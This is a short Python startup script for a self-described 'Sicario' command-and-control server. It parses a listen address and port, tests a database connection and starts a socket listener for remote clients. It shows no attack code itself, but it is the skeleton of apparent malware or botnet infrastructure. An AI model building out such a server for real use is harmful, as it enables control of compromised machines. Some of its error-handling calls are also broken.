#!/usr/bin/python

# Error codes (client side)
# 1 - hash does not exist in database

import log
import listener
import socket_client
import database

version = '0.2'

import argparse
import sys

parser = argparse.ArgumentParser()
parser.add_argument('--host', dest='host',
				  help='IP address to listen at',
				  default='0.0.0.0')
parser.add_argument('--port', dest='port',
					help='Port to listen at',
					default='7319')

class Sicario:
	db_handler = False

	def __init__ (self, version, args):
		
		log.log('Sicario C&C server {} starting...'.format(version))
		
		log.log('Trying to connect to database...')
		try:
			db = database.Database({'filename':'db/sicario'})
		except IOError as e:
			log('Exception: {}'.format(e))
			log('Failed to connect to a database! Exiting..')
			sys.exit()
		log.log('Connected to database!')

		# Actually, we won't do anything with database here. This section is (currently) only to test if 
		# connection to database can be made. We don't want database to crash right before adding
		# new client, do we?
		
		log.log('Starting listener at {}:{}...'.format(args.host, args.port))
		
		try:
			listener.listen(args.host, int(args.port), socket_client.Client)
		except IOError as e:
			log.log('Exception: {}'.format(e))
			log.log('Failed to start listener! Exiting..')
			sys.exit()
		
	def exit (self):
		log.log('Exitting...')
		sys.exit()
		
if __name__ == '__main__':
	args = parser.parse_args()
	Sicario(version, args)